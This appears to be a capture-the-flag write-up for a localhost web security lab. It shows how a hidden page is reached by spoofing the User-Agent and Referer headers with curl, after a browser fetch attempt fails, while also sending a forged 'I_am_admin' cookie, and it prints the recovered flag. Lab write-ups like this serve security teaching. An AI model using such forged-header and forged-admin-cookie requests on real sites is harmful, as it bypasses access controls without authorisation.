
From source code, I could find

"Let's use this browser : "ft_bornToSec". It will help you a lot."

"You must come from : "https://www.nsa.gov/"."


I got the idea to modify header of HTTP request.

I tried to edit it in brower but it doesn't let me to change 'Referer'

So I used
```
await fetch("http://localhost:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f", {
    "credentials": "include",
    "headers": {
        "User-Agent": "ft_bornToSec",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0, i"
    },
    "referrer": "https://www.nsa.gov/",
    "method": "GET",
    "mode": "cors"
}); 
```
But it doesn't work. Apparently, even when we tried to change this, browser blocks it.

```
curl 'http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' -H 'User-Agent: ft_bornToSec' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Referer: https://www.nsa.gov/' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' -H 'Pragma: no-cache'
```

I got it!

FLAG : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188